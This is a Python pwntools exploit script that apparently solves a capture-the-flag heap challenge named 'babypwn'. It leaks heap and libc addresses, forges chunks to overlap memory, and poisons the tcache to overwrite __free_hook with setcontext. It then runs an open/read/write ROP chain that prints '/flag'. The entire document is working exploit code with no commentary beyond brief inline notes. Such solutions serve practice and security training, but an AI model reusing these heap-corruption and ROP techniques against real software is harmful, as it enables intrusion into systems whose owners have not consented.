from pwn import *

context(arch='amd64', log_level='debug')

io = process('./babypwn')
# io = process(['../../../../ld/ld-2.27.so', './babypwn'], env={"LD_PRELOAD": "./libc.so.6"})
libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
# libc = ELF('./libc.so.6')

def add(size):
    io.sendlineafter(b'>>> ', b'1')
    io.sendlineafter(b'size:', str(size).encode())


def delete(index):
    io.sendlineafter(b'>>> ', b'2')
    io.sendlineafter(b'index:', str(index).encode())


def edit(index, content):
    io.sendlineafter(b'>>> ', b'3')
    io.sendlineafter(b'index:', str(index).encode())
    io.sendafter(b'content:', content)


def show(index):
    io.sendlineafter(b'>>> ', b'4')
    io.sendlineafter(b'index:\n', str(index).encode())
    lodword = int(io.recvuntil(b'\n', drop=True).decode(), 16)
    lodword = decrypt(lodword)
    hidword = int(io.recvuntil(b'\n', drop=True).decode(), 16)
    hidword = decrypt(hidword)
    return lodword + (hidword << 32)

def get_bits(value, start, end):
    return (value >> start) & ((1 << (end - start)) - 1)


def decrypt(value):
    for i in range(2):
        low13 = get_bits(value, 0, 13)
        mid13 = get_bits(value, 13, 26)
        mid13 ^= low13
        high6 = get_bits(value, 26, 32)
        high6 ^= get_bits(mid13, 0, 6)
        value = low13 + (mid13 << 13) + (high6 << 26)

        high17 = get_bits(value, 15, 32)
        low15 = get_bits(value, 0, 15)
        low15 ^= get_bits(high17, 2, 17)
        value = low15 + (high17 << 15)

        first5 = get_bits(value, 0, 5)
        second5 = get_bits(value, 5, 10)
        second5 ^= first5
        third5 = get_bits(value, 10, 15)
        third5 ^= second5
        fourth5 = get_bits(value, 15, 20)
        fourth5 ^= third5
        fifth5 = get_bits(value, 20, 25)
        fifth5 ^= fourth5
        sixth5 = get_bits(value, 25, 30)
        sixth5 ^= fifth5
        last2 = get_bits(value, 30, 32)
        last2 ^= get_bits(sixth5, 0, 2)
        value = first5 + (second5 << 5) + (third5 << 10) + (fourth5 << 15) + \
            (fifth5 << 20) + (sixth5 << 25) + (last2 << 30)
    return value

add(100)                            # chunk 0, used for leaking address
chunk0_addr = show(0)
print(hex(chunk0_addr))
add(0x100)                          # chunk #1
for i in range(7):
    add(0xF0)                       # chunk #2~8
chunk1_addr = chunk0_addr + 0x400

payload = p64(chunk1_addr + 0x10)
payload += p64(0x810 + 0x30 - 0x10)
payload += p64(chunk1_addr - 0x8)
payload += p64(chunk1_addr)
payload += p64(0)
edit(1, payload)

add(0x28)                           # chunk #9
add(0x100)                          # chunk #10
add(0x20)                           # chunk #11, goalkeeper
edit(9, cyclic(0x28))               # this can change the chunk #9's size from 0x511 to 0x500
edit(9, cyclic(0x20) + p64(0x810 + 0x30 - 0x10))        # write correct prev_size
edit(10, cyclic(0xF0) + p64(0) + p64(0x41))

for i in range(7):
    delete(8 - i)                   # delete chunk #2~8
delete(10)

for i in range(2):
    add(0xF0)                       # recover chunk #1, 2
add(0xF0 + 0x100)                   # recover chunk #3
main_arena = show(3) - 96
print(hex(main_arena))
__malloc_hook = main_arena - 0x10
base = __malloc_hook - libc.symbols['__malloc_hook']
__free_hook = base + libc.symbols['__free_hook']
setcontext = base + libc.symbols['setcontext']
openfile = base + libc.symbols['open']
readfile = base + libc.symbols['read']
writefile = base + libc.symbols['write']
poprdi_ret = base + 0x23B6A
poprsi_ret = base + 0x2601F
poprdx_ret = base + 0x142C92
addrsp0x18_ret = base + 0x349ea

add(0xF0 + 0x100)                   # chunk #5
edit(5, cyclic(0xF0) + p64(0) + p64(0x101) + p64(__free_hook))
add(0xF0)                           # chunk #6
add(0xF0)                           # chunk #7, to __free_hook
edit(7, p64(setcontext + 0x3D))     # change __free_hook to setcontext + 0x3D, ready for stack pivoting

add(0xF0 + 0x100)                   # chunk #8
chunk8_addr = chunk1_addr + 0x410

ROP = b'/flag'.ljust(0x30, b'\x00')     # 0x0
ROP += p64(chunk8_addr + 0x10)          # 0x30
ROP += p64(poprsi_ret)                  # 0x38
ROP += p64(2)                           # 0x40
ROP += p64(openfile)                    # 0x48
ROP += p64(poprdi_ret)                  # 0x50
ROP += p64(3)                           # 0x58
ROP += p64(poprsi_ret)                  # 0x60
ROP += p64(chunk8_addr + 0xF0)          # 0x68
ROP += p64(poprdx_ret)                  # 0x70
ROP += p64(0x30)                        # 0x78
ROP += p64(readfile)                    # 0x80
ROP += p64(poprdi_ret)                  # 0x88
ROP += p64(1)                           # 0x90
ROP += p64(addrsp0x18_ret)              # 0x98
ROP += p64(chunk8_addr + 0x40)          # 0xA0
ROP += p64(poprdi_ret)                  # 0xA8
ROP += p64(0xdeadbeef)                  # 0xB0
ROP += p64(poprsi_ret)                  # 0xB8
ROP += p64(chunk8_addr + 0xF0)          # 0xC0
ROP += p64(poprdx_ret)                  # 0xC8
ROP += p64(0x30)                        # 0xD0
ROP += p64(writefile)                   # 0xD8
edit(8, ROP)
gdb.attach(io)
time.sleep(5)
delete(8)

io.interactive()